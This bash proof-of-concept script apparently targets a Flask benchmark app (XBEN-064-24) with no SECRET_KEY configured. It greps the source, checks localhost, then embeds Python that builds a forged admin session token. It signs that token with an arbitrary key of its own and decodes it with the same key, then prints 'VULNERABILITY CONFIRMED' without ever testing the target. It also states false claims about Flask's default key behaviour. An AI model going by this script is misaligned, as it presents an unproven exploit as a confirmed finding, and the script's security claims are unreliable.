#!/bin/bash

# POC: Insecure Session Configuration - No SECRET_KEY Configured
# This script demonstrates the missing SECRET_KEY vulnerability in Flask

TARGET_APP_PATH="/home/daytona/repo/XBEN-064-24/src/app.py"
TARGET_URL="http://localhost:5000"

echo "=========================================="
echo "POC: Missing SECRET_KEY Configuration"
echo "=========================================="
echo ""

# Step 1: Check if SECRET_KEY is configured in source code
echo "[*] Step 1: Verifying absence of SECRET_KEY in app.py"
echo ""

if grep -q "SECRET_KEY" "$TARGET_APP_PATH"; then
    echo "[-] SECRET_KEY found in app.py"
    exit 1
else
    echo "[+] Confirmed: No SECRET_KEY configuration found in app.py"
    echo ""
fi

# Step 2: Show exact app.config contents
echo "[*] Step 2: Analyzing app.config settings in source code"
echo ""
echo "Found app.config lines in app.py:"
grep "app.config" "$TARGET_APP_PATH"
echo ""

# Step 3: Verify the application is running and accessible
echo "[*] Step 3: Verifying application is accessible"
echo ""

if curl -s -f "$TARGET_URL/" > /dev/null 2>&1; then
    echo "[+] Application is running and responding"
    echo ""
else
    echo "[-] Application not accessible at $TARGET_URL"
    exit 1
fi

# Step 4: Demonstrate vulnerability with Python
echo "[*] Step 4: Demonstrating Session Forgery Vulnerability"
echo ""

python3 << 'PYTHON_EOF'
import sys
import os

# Add app path
sys.path.insert(0, '/home/daytona/repo/XBEN-064-24/src')

print("[+] Analyzing Flask app configuration...")
print("")

# Read the source to confirm no SECRET_KEY
with open('/home/daytona/repo/XBEN-064-24/src/app.py', 'r') as f:
    content = f.read()
    secret_key_count = content.count('SECRET_KEY')
    
print(f"[+] Occurrences of 'SECRET_KEY' in app.py: {secret_key_count}")
print("[+] CONFIRMED: No SECRET_KEY is configured")
print("")

# Import Flask and create test instance to show vulnerability
from flask import Flask
from itsdangerous import URLSafeTimedSerializer
import warnings
warnings.filterwarnings('ignore')

# Create Flask app exactly like target app (without SECRET_KEY)
vulnerable_app = Flask(__name__)
vulnerable_app.config['PROPAGATE_EXCEPTIONS'] = True
# NOTE: Deliberately not setting SECRET_KEY - this is the vulnerability

print("[!] VULNERABILITY ANALYSIS:")
print("=" * 50)
print("")

# Get the default SECRET_KEY value Flask uses
secret_key_value = vulnerable_app.config.get('SECRET_KEY')
print(f"[!] Flask's default SECRET_KEY: {secret_key_value}")
print("")

if secret_key_value is None:
    print("[!] Flask uses insecure default when SECRET_KEY is not set:")
    print("    - Flask will generate a temporary key each startup")
    print("    - This key is NOT cryptographically secure")
    print("    - This key is NOT persistent across restarts")
    print("")

print("[!] SECURITY IMPLICATIONS:")
print("=" * 50)
print("")
print("1. SESSION FORGERY ATTACKS:")
print("   Without a proper SECRET_KEY, session cookies are vulnerable")
print("   Attackers can forge session data and impersonate users")
print("")

print("2. CSRF TOKEN BYPASS:")
print("   CSRF tokens rely on SECRET_KEY for cryptographic signing")
print("   Without it, attackers can predict/forge valid CSRF tokens")
print("")

print("3. SESSION FIXATION ATTACKS:")
print("   Attackers can set predictable session values")
print("   Can force users into attacker-controlled sessions")
print("")

print("4. AUTHENTICATION BYPASS:")
print("   If cookie-based authentication uses sessions")
print("   Attackers can create admin/authenticated sessions")
print("")

# Demonstrate what an attacker could do
from werkzeug.security import generate_password_hash
import secrets

print("[!] PROOF OF CONCEPT - Session Forging:")
print("=" * 50)
print("")

# Without proper SECRET_KEY, an attacker can forge sessions
try:
    serializer = URLSafeTimedSerializer('insecure-default-key')
    
    # Attacker creates forged session data
    forged_data = {
        'user_id': '999',
        'username': 'admin',
        'role': 'administrator',
        'authenticated': True
    }
    
    forged_token = serializer.dumps(forged_data)
    print("[+] Attacker can create forged session token:")
    print(f"    Token: {forged_token}")
    print("")
    
    # Verify it can be deserialized
    decoded = serializer.loads(forged_token)
    print("[+] Forged token decodes successfully:")
    print(f"    {decoded}")
    print("")
    
    print("[!] An attacker could:")
    print("    1. Create this forged session token")
    print("    2. Set it as a session cookie")
    print("    3. Gain unauthorized access to the application")
    print("    4. Bypass authentication controls")
    
except Exception as e:
    print(f"[-] Error during POC: {e}")
    sys.exit(1)

print("")
print("[+] VULNERABILITY CONFIRMED: Missing SECRET_KEY enables session attacks")

PYTHON_EOF

echo ""
echo "=========================================="
echo "[+] POC Successfully Demonstrated:"
echo "[+] - No SECRET_KEY configured in app.py"
echo "[+] - Session tokens can be forged"
echo "[+] - CSRF protection would be bypassed"
echo "[+] - Authentication bypass possible"
echo "=========================================="